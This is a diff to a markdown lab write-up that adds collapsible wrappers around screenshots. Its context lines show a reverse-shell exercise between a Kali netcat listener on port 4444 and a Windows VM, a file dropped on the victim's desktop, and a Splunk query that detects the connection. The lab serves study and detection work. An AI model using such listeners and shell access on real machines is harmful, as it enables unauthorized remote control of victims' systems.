@@ -31,7 +31,14 @@ nc -lvnp 4444
 
 Successfully received incoming shell from Victim:
 connect to [192.168.0.13] from (192.168.0.12) 49280
+<details>
+<summary>🖼️ Session Connection</summary>
+
 ![Screenshot 2025-04-25 124346](https://github.com/user-attachments/assets/c15da569-4be4-4ddd-9196-e2b718d1eba4)
+
+</details>
+
+
 
 <details>
   <summary>📄 Session Output (Click to Expand)</summary>
@@ -115,7 +122,12 @@ d-r---         4/19/2025   2:30 PM                Videos
 
 **Command:** `cd Desktop`  
 **Command:** `echo You Have been Hacked > hacked.txt`  
+<details>
+<summary>🖼️ Hacked file</summary>
+
 ![Screenshot 2025-04-25 143943](https://github.com/user-attachments/assets/d1c6573f-c40f-4cc7-a46d-9d2b085865c5)
+
+</details>
 **Command:** `dir`  
 **Output:**
     Directory: C:\Users\vboxuser\Desktop
@@ -136,5 +148,12 @@ index=sysmon EventCode=3 DestinationPort=4444
 | table _time, Image, User, DestinationIp, DestinationPort
 ```
 ✅ Observed PowerShell creating a TCP connection to Kali on port 4444.
+<details>
+<summary>🖼️ TCP connection Event</summary>
+
 ![Screenshot 2025-04-25 140538](https://github.com/user-attachments/assets/28aec82d-ae51-4fc1-9b1f-3031f59ddddb)
+
+</details>
+
+
 
